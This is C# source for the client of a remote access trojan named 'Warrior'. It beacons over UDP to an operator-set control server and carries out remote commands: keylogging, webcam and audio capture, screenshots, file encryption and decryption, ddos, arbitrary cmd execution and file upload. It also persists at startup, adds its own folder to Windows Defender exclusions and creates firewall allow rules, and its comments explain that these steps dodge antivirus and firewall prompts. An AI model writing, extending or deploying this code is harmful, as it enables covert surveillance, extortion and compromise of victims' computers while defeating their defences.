using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;

class Program
{
    // DO note the EXE must be run as Admin for everything to go smothly. 
    

    public static bool isConnected = false;
    public static DateTime lastResponse = DateTime.MinValue;
    static IPEndPoint serverEp;
    static List<string> Triggers = new List<string>() { "getip", "gethostname", "areyoualive" , "getcpu", "getram","networkinfo", "listpr", "shutdown"
    , "webcam","recaudio", "screenshot", "keylog", "encrypt", "selfd", "disables"};
    static public UdpClient client = new UdpClient();
    static DateTime lastAttempt = DateTime.MinValue;
    static DateTime lastActivity = DateTime.MinValue;
    static int said = 0;
    static void DisableUdpReset(UdpClient c)
    {
        const int SIO_UDP_CONNRESET = -1744830452;
        c.Client.IOControl(
            (IOControlCode)SIO_UDP_CONNRESET,
            new byte[] { 0, 0, 0, 0 },
            null
        );
    }
    static void ConnectTo()
    {
        client?.Close();        
        client = new UdpClient();
        DisableUdpReset(client);
        client.Client.ReceiveTimeout = 3000;

        serverEp = new IPEndPoint(IPAddress.Parse("192.168.1.13"), 3400); // here you set the IP Of the Target Server - So your own server ip and Port
        client.Connect(serverEp);

        
        client.Send(Encoding.UTF8.GetBytes("ping"));
        lastAttempt = DateTime.Now;
        

        Console.WriteLine("Connect attempt sent");
    }

    static void ReceiveAvailable()
    {
        client.Send(Encoding.UTF8.GetBytes("data1=" + Environment.MachineName));
        try
        {
            while (client.Available > 0)
            {
                var data = client.Receive(ref serverEp);

                var decode = Encoding.UTF8.GetString(data);
                lastActivity = DateTime.Now;
                isConnected = true;

                if (decode == "pong")
                    continue;

                Console.WriteLine(decode);
                Warrior.Commands CC = new Warrior.Commands();
                foreach (string i in Triggers)
                {
                    if (i == decode)
                    {
                        Console.WriteLine(decode);
                        CC.RunCommand(decode, client);
                    }
                }
                if (decode.Contains("runcmd="))
                {
                    CC.RunCommand(decode, client);

                }
                else if (decode.Contains("fileupload="))
                {
                    CC.RunCommand(decode, client);

                }
                else if (decode.Contains("openurl("))
                {
                    CC.RunCommand(decode, client);
                }
                else if (decode.Contains("killpr="))
                {
                    CC.RunCommand(decode, client);
                }
                else if (decode.Contains("fakerr="))
                {
                    CC.RunCommand(decode, client);
                }
                else if (decode.Contains("decrypt="))
                {
                    CC.RunCommand(decode, client);
                }
                else if (decode.Contains("ddos="))
                {
                    CC.RunCommand(decode, client);
                }
            }
        }
        catch { }

        
    }
    static void Main()
    {
        string RunCmd(string command)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c " + command,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            using var p = Process.Start(psi);

            string output = p.StandardOutput.ReadToEnd();
            string error = p.StandardError.ReadToEnd();
            p.WaitForExit();

            return output + error;
        }

        var a = new Warrior.SelfStart();
        a.AddSelfToStartup(); // Adds To Startup

        string exePath = Process.GetCurrentProcess().MainModule.FileName;
        string exeDirectory = Path.GetDirectoryName(exePath);

        string RunPowerShell(string cmd)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -ExecutionPolicy Bypass -Command " + cmd,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            using var p = Process.Start(psi);
            string output = p.StandardOutput.ReadToEnd();
            string error = p.StandardError.ReadToEnd();
            p.WaitForExit();

            return output + error;
        }

        string exclusionPath = exeDirectory;
        string addExclusionCommand = $"Add-MpPreference -ExclusionPath \"{exclusionPath}\"";

        RunPowerShell(addExclusionCommand); // This adds the current directory the Program ran on, into a Exlcusion path, so windows AV wont scan the file for threats.


        void AddFirewallRuleIfMissing(string programPath, string ruleName)
        {
            string checkCmd =
                $"netsh advfirewall firewall show rule name=\"{ruleName}\"";

            string result = RunCmd(checkCmd);

            if (!result.Contains("No rules match"))
                return;

            RunCmd(
                $"netsh advfirewall firewall add rule " +
                $"name=\"{ruleName}\" dir=in action=allow " +
                $"program=\"{programPath}\" enable=yes"
            );

            RunCmd(
                $"netsh advfirewall firewall add rule " +
                $"name=\"{ruleName} (OUT)\" dir=out action=allow " +
                $"program=\"{programPath}\" enable=yes"
            );
        }

        string appPath = exePath;

        AddFirewallRuleIfMissing(appPath, "Warrior"); // this allows the program to connect to the Server without the firwall asking for permission to be connected.

        static void StartClient() 
        {
            while (true)
            {
                try
                {
                    if (!isConnected &&
                        (DateTime.Now - lastAttempt).TotalSeconds >= 10)
                    {
                        Console.WriteLine("Reconnecting...");
                        ConnectTo();
                    }

                    if (client != null)
                    {
                        ReceiveAvailable();  
                        MaybeSendHeartbeat(); 
                    }

                    Thread.Sleep(50);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("ERR: " + ex.Message);
                    isConnected = false;
                    Thread.Sleep(2000);
                }
            }
        }


        static void MaybeSendHeartbeat()
        {
            if ((DateTime.Now - lastActivity).TotalSeconds > 5)
            {
                client.Send(Encoding.UTF8.GetBytes("ping"));
            }
        }

        StartClient();


    }

}